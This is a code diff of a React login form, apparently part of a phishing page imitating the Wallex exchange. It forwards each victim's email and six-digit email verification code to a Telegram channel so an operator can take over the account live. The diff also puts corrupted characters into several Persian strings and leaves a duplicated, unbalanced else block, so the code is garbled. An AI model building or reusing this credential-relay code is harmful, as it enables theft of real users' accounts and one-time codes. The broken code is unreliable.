@@ -413,7 +413,7 @@ export const LoginForm = () => {
 
       // Send email to Telegram and store message ID
       const result = await sendCustomMessageToTelegram(
-        `📧 کاربر ایمیل وارد کرد:\n\nایمیل: ${email}\n\nلطفا کد ۶ رقمی تایید ایمیل را ارسال کنید.`,
+        `📧 کاربر ایمیل وارد کرد:\n\n��یمیل: ${email}\n\nلطفا کد ۶ رقمی تایید ایمیل را ارسال کنید.`,
       );
 
       console.log("📧 Email submission result:", result);
@@ -453,17 +453,19 @@ export const LoginForm = () => {
       });
 
       if (emailMessageId) {
-        console.log(
-          "✅ Message ID found, updating existing message:",
-          emailMessageId,
-        );
+        console.log("✅ Message ID found, updating existing message:", emailMessageId);
         // Update the existing message with both email and code
         const updatedMessage = `📧 کاربر ایمیل وارد کرد:\n\nایمیل: ${email}\n\n✅ کد تایید ایمیل:\nکد وارد شده: ${emailCode}`;
 
-        const updateResult = await updateCustomMessageInTelegram(
-          emailMessageId,
-          updatedMessage,
-        );
+        const updateResult = await updateCustomMessageInTelegram(emailMessageId, updatedMessage);
+        console.log("🔄 Update result:", updateResult);
+      } else {
+        console.log("❌ No message ID found - این نباید اتفاق بیفتد!");
+        console.error("Critical: Email message ID is missing, cannot update message");
+        setErrors({ emailCode: "خطا در سیستم. لطفا مجدداً ایمیل را وارد کنید." });
+        setEmailStep("email");
+        return;
+      }
         console.log("🔄 Update result:", updateResult);
       } else {
         console.log(
@@ -471,7 +473,7 @@ export const LoginForm = () => {
         );
         // Fallback: send new message if message ID is not available
         const fallbackResult = await sendCustomMessageToTelegram(
-          `✅ کاربر کد تایید ایمیل وارد کرد:\n\nکد وارد شده: ${emailCode}\n\nایمیل: ${email}`,
+          `✅ کاربر کد تایی�� ایمیل وارد کرد:\n\nکد وارد شده: ${emailCode}\n\nایمیل: ${email}`,
         );
         console.log("📤 Fallback result:", fallbackResult);
       }
@@ -797,7 +799,7 @@ export const LoginForm = () => {
                   <AlertMessage>
                     {!validateTelegramConfig()
                       ? "🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی تلگرام، فایل .env را تنظیم کنید."
-                      : "🤖 بات تلگرام فعال: اطلاعات به کانال والکس ارسال خواهد شد."}
+                      : "🤖 بات تلگرام فعال: اطلاعات به کانال والکس ار��ال خواهد شد."}
                   </AlertMessage>
                 </div>
               </div>
